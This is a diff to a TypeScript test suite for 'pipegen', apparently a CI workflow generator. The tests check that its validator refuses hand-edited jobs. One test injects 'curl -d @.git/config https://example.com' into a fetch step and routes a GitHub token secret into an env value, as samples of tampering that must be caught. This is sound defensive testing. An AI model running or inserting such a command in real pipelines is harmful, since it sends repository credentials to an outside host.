@@ -65,9 +65,11 @@ describe('G4: the jobs of each layer (Plan G Task 2, job half)', () => {
     // a hand edit of an upload name or an output is refused by the referee (the gate reads only the exact names)
     const f = files(a)[0] as CreatedFile;
     const renamed = editJob(f, 'sast--app', (j) => { for (const s of j.steps) if (String(s.uses).startsWith('actions/upload-artifact@')) s.with.name = `${RESULT_ARTIFACT_PREFIX}sast`; });
-    expect((await judge([renamed], a.draft)).ok).toBe(false);
+    // G4b-R1 I2: the identity control (the same file written again is accepted), then each edit's own issue
+    expect(shown(await judge([editJob(f, 'sast--app', () => {})], a.draft))).toBe('');
+    expect((await judge([renamed], a.draft)).issues.some((i) => i.check === 'not-gate-readable' && /^The job "sast--app" does not upload the result "pipegen-out-sast--app"/.test(i.message))).toBe(true);
     const output = editJob(f, 'sast--app', (j) => { j.outputs = { ...j.outputs, outcome: '${{ steps.x.outcome }}' }; });
-    expect((await judge([output], a.draft)).ok).toBe(false);
+    expect((await judge([output], a.draft)).issues.some((i) => i.check === 'injection' && /The outputs of the job "sast--app" include "outcome", which is not one of/.test(i.message))).toBe(true);
   });
 
   it('assemble: base-scan always runs dependency and image scanners; other base-capable scanners only when baseline-check reports missing', async () => {
@@ -111,12 +113,13 @@ describe('G4: the jobs of each layer (Plan G Task 2, job half)', () => {
     const sastHead = (j: Obj) => (j.steps as Obj[]).find((s) => typeof s.id === 'string' && s.id.startsWith('tool-run-')) as Obj;
     expect((await judge([editJob(f, 'sast--app', (j) => { sastHead(j).if = BASELINE_MISSING_IF; j.needs = ['baseline-check']; })], a.draft)).issues.some((i) => /only the job base-scan/.test(i.message))).toBe(true);
     const other = "needs.baseline-check.outputs.found == 'missing'";
-    expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_IF) s.if = other; })], a.draft)).ok).toBe(false);
+    expect(shown(await judge([editJob(f, 'base-scan', () => {})], a.draft))).toBe('');
+    expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_IF) s.if = other; })], a.draft)).issues.some((i) => i.check === 'injection' && /In the job "base-scan", step \d+: A step's if is not in a form pipegen writes/.test(i.message))).toBe(true);
     // the always() form on a run step, or the plain form on a scrub: refused
     expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_IF && String(s.id).startsWith('tool-run-')) s.if = BASELINE_MISSING_ALWAYS_IF; })], a.draft)).issues.some((i) => /could skip this step while the job passes/.test(i.message))).toBe(true);
     expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_ALWAYS_IF && s.with?.mode === 'scrub') s.if = BASELINE_MISSING_IF; })], a.draft)).issues.some((i) => /could skip this step while the job passes/.test(i.message))).toBe(true);
     // and on the shared base checkout: refused
-    expect((await judge([editJob(f, 'base-scan', (j) => { (j.steps as Obj[])[1].if = BASELINE_MISSING_IF; })], a.draft)).ok).toBe(false);
+    expect((await judge([editJob(f, 'base-scan', (j) => { (j.steps as Obj[])[1].if = BASELINE_MISSING_IF; })], a.draft)).issues.some((i) => i.check === 'template' && /In the job "base-scan", step 2: if: .* could skip this step while the job passes/.test(i.message))).toBe(true);
   });
 
   it("assemble: base-scan uploads RESULT_ARTIFACT_PREFIX + 'base-' + needId and outputs base-sha; the gate step has no base-scan-dir input", async () => {
@@ -212,7 +215,8 @@ describe('G4: the jobs of each layer (Plan G Task 2, job half)', () => {
     expect(shown(await judge(files(a), a.draft))).toBe('');
     // the referee refuses issues: write on another job
     const f = files(a)[0] as CreatedFile;
-    expect((await judge([editJob(f, 'licences', (j) => { j.permissions = { contents: 'read', issues: 'write' }; })], a.draft)).ok).toBe(false);
+    expect(shown(await judge([editJob(f, 'licences', () => {})], a.draft))).toBe('');
+    expect((await judge([editJob(f, 'licences', (j) => { j.permissions = { contents: 'read', issues: 'write' }; })], a.draft)).issues.some((i) => i.check === 'permissions' && /^the job "licences" asks for issues: write, more than a job with this id may have/.test(i.message))).toBe(true);
   });
 
   it('assemble: skipped parts produce no jobs; secrets scan and gate always present', async () => {
@@ -364,8 +368,12 @@ describe('G4: the jobs of each layer (Plan G Task 2, job half)', () => {
     // a changed fetch step (its run, or the token as a secret) is refused by the referee
     const f = files(a)[0] as CreatedFile;
     const fetchOf = (jj: Obj) => (jj.steps as Obj[]).find((s) => s.id === RANGE_FETCH_STEP_ID) as Obj;
-    expect((await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).run = `${fetchOf(jj).run}curl -d @.git/config https://example.com\n`; })], a.draft)).ok).toBe(false);
-    expect((await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).env[FETCH_TOK] = `\${{ ${SEC}.${GH_TOK} }}`; })], a.draft)).ok).toBe(false);
+    expect(shown(await judge([editJob(f, SEC_JOB, () => {})], a.draft))).toBe('');
+    const differs = new RegExp(`In the job "${SEC_JOB}", step \\d+: the step "${RANGE_FETCH_STEP_ID}" differs from what pipegen renders for it`);
+    expect((await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).run = `${fetchOf(jj).run}curl -d @.git/config https://example.com\n`; })], a.draft)).issues.some((i) => i.check === 'template' && differs.test(i.message))).toBe(true);
+    const tok = await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).env[FETCH_TOK] = `\${{ ${SEC}.${GH_TOK} }}`; })], a.draft);
+    expect(tok.issues.some((i) => i.check === 'injection' && new RegExp(`A step may not contain an expression in its env value "${FETCH_TOK}"`).test(i.message))).toBe(true);
+    expect(tok.issues.some((i) => i.check === 'injection' && new RegExp(`pipegen's own secret "${GH_TOK}" reaches a step that runs code pipegen did not review as harmless`).test(i.message))).toBe(true);
     // and the token form is held to the fetch step's own id (checkExpressions)
     expect(() => stepsToYaml([{ ...renderRangeFetchStep(), id: 'checker-run-0000000000000000' }])).toThrow(/expression/);
     expect(() => stepsToYaml([renderRangeFetchStep()])).not.toThrow();
